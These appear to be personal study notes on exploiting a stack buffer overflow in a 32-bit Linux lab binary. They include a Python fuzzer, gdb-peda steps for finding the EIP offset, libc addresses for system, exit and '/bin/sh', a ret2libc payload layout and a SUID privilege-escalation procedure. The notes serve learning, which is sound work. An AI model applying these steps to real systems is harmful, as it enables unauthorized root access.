Gadgets are small snippets of code followed by a ret instruction, e.g. pop rdi; ret. We can manipulate the ret of these gadgets in such a way as to string together a large chain of them to do what we want

jmp eax

We can see the compiled EAX address does not change in the binary and can use this to place our payload or attempt to find a JMP EAX gadget. A piece of code which will include a JMP EAX instruction allowing us to perform the attack without relying on disabled ASLR. 

Non-executable stack (NX) is a virtual memory protection mechanism to block shell code injection from executing on the stack by restricting a particular memory and implementing the NX bit. But this technique is not really worthy against return to lib attacks, although they do not need executable stacks.

Bypassing non-executable stack defence via ret2lib attack by making use of system functions which exist in the system such as "system", "exit".

A ret2libc attack does not involve placing any shellcode into the stack as a payload but instead makes use of in-built functions to create the exploit

gdb-peta. "run" is our input parameter which goes into the binary. We can create a fuzzer in Python which will send so many bytes until the stack is "overflown". 

Code below:
	import os
	# Initial buffer
	buffer=["A"]
	# Increment counter
	counter=100
	# While the buffer is less than 30
	while len(buffer) <= 30:
		# Add 30 "A" characters which will result in 3,000 characters getting sent to the binary
		buffer.append("A" * counter)
		# Counter increments
		counter += 100

	# For the number of characters in the buffer making a string of As
	for string in buffer:
	# Send the total number of strings
	print("Fuzzing %s bytes" % len(string))
	# Launch the binary with the string payload
	os.system("./pwnme %s" % string)

gdb-peta input: run $(python -c 'print "A" * 268 + "C" * 4')
SIGSEGV(Segmentation Fault) could be a queue to an overflow opportunity
Get the information on the eip which is the offset

EIP offset is the exact value that gives us the information that how many bytes will fill the buffer and overflow into the return address (EIP).

EIP offset is found within the pattern which is made. The hex value of the EIP address should translate to the number of characters found which have been taken to fill the buffer to its rim. 

offset is 0x41332541 at value 268

Means 268 bytes taken to overwrite the EIP.

a return lib 2 c attack involves viewing the address in ldd (Shared libraries)

Start the binary and add a breakpoint since ASLR is not enabled. Shared libraries contain binaries of Linux allowing us to obtain their memory addresses.

find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7f85a69 ("/bin/sh")

p &exit
$1 = (<text variable, no debug info> *) 0xb7e571b0 <__GI_exit>
p &system
$2 = (<text variable, no debug info> *) 0xb7e643e0 <__libc_system>

payload = EIP offset + system address + exit address + /bin/sh address

By combining all of these addresses it is possible to pull of a ret2lib attack

https://www.codeproject.com/Articles/5261220/A-Simple-32bit-Ret2libc-Attack-in-Linux

https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/


https://www.usenix.org/system/files/conference/woot17/woot17-paper-patrick-evans.pdf

eax is a 32-bit general-purpose register with two common uses: to store the return value of a function

call eax is a function call. It will call the function that EAX points to.

Without bypass-nx method we would be doing a simple buffer overflow

We fuzz the application
get the EIP offset
get the return address (call eax)

https://reboare.github.io/bof/linux-stack-bof-3.html

ESP register is the current stack pointer and EBP is the base pointer for the current stack frame

https://stackoverflow.com/questions/21718397/what-are-the-esp-and-the-ebp-registers
esp is the stack pointer, ebp is/was for a stack frame so that when you entered a function ebp could get a copy of esp at that point, everything on the stack before that happens, return address, passed in parameters, etc and things that are global for that function (local variables) will now be a static distance away from the stack frame pointer for the duration of the function. esp is now free to wander about as the compiler desires and can be used when nesting to other functions (each needs to preserve the ebp naturally).

it is a lazy way to manage the stack. makes compiler debugging a lot easier, makes understanding the code generated by the compiler easier, but burns a register that might have been otherwise general purpose

pattern offset 0x41332541

No matter how much you flood the buffer, the EIP can be located in a static value of an offset. This offset value is the number of bytes needed in order to cause the overflow in the buffer. This  

Viewing the process info: "info proc"

This will give us a process number which can be analysed further using /proc/$(process number)/maps

You can then check the permissions on the binary including the stack running in memory.

This can give you the idea of whether DEP is enabled or not if the stack permissions are executable or not.

Where is the EIP involved in bypassing DEP when we're not using it in the payload?
	The EIP needs to be located in order for us to create our own address pointing to the "fake stack". The only way we can do this is by getting the EIP offset for the next instructions to be triggered. This will be the ROP chain created by us.


As far as I know, the stack address which initially contained with EIP will be overwritten and contains an address to the system() when system() is executing. This happens due to static addresses in the shared libraries due to no ASLR.


Privilege escalation against a SUID:

Run the binary, using the crash, get the process details to get the details of the addresses we need

tux@tux:~$ cat /proc/1177/maps 
08048000-08049000 r-xp 00000000 08:01 40250      /home/tux/0x00/pwnme-nx
08049000-0804a000 rw-p 00000000 08:01 40250      /home/tux/0x00/pwnme-nx
b7e25000-b7e26000 rw-p 00000000 00:00 0 
b7e26000-b7fcd000 r-xp 00000000 08:01 953        /lib/i386-linux-gnu/i686/cmov/libc-2.19.so
b7fcd000-b7fcf000 r--p 001a7000 08:01 953        /lib/i386-linux-gnu/i686/cmov/libc-2.19.so
b7fcf000-b7fd0000 rw-p 001a9000 08:01 953        /lib/i386-linux-gnu/i686/cmov/libc-2.19.so
b7fd0000-b7fd3000 rw-p 00000000 00:00 0 
b7fd9000-b7fdc000 rw-p 00000000 00:00 0 
b7fdc000-b7fdd000 r-xp 00000000 00:00 0          [vdso]
b7fdd000-b7fdf000 r--p 00000000 00:00 0          [vvar]
b7fdf000-b7ffe000 r-xp 00000000 08:01 8188       /lib/i386-linux-gnu/ld-2.19.so
b7ffe000-b7fff000 r--p 0001f000 08:01 8188       /lib/i386-linux-gnu/ld-2.19.so
b7fff000-b8000000 rw-p 00020000 08:01 8188       /lib/i386-linux-gnu/ld-2.19.so
bffdd000-c0000000 rw-p 00000000 00:00 0          [stack]

Out of this output, we want to grab the first address which is the executable libc binary which contains the functions we need to create our ROP chain.

We need to do this for the system binary in libc in addition to the exit binary.

We are now just missing the sh binary which is gained through the following technique

strings -a -t x /lib/i386-linux-gnu/i686/cmov/libc-2.19.so | grep /bin/sh
-a tells it to scan the entire file; -t x tells it to output the offset in hex.


The ROP chain comes into here... 

popret instructions are simply a sequence of pop instructions followed by a ret. Remember that pop instruction increment esp and therefore can be considered to be removing an item from the stack. If we return into one of these gadgets it will adjust the stack pointer each time, removing the arguments we placed in prior, and then return into the next value we’ve placed on the stack.

The work done here is useless when ASLR comes into the question because of the fact that known addresses are then randomised.

Further work...
The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)” by Hovav Shacham

Read this paper.

Bypassing binary with ASLR enabled.

PLT stands for Procedure Linkage Table which is, put simply, used to call external procedures/functions whose address isn't known in the time of linking, and is left to be resolved by the dynamic linker at run time.

GOT stands for Global Offsets Table and is similarly used to resolve addresses. Both PLT and GOT and other relocation information is explained in greater length in this article.
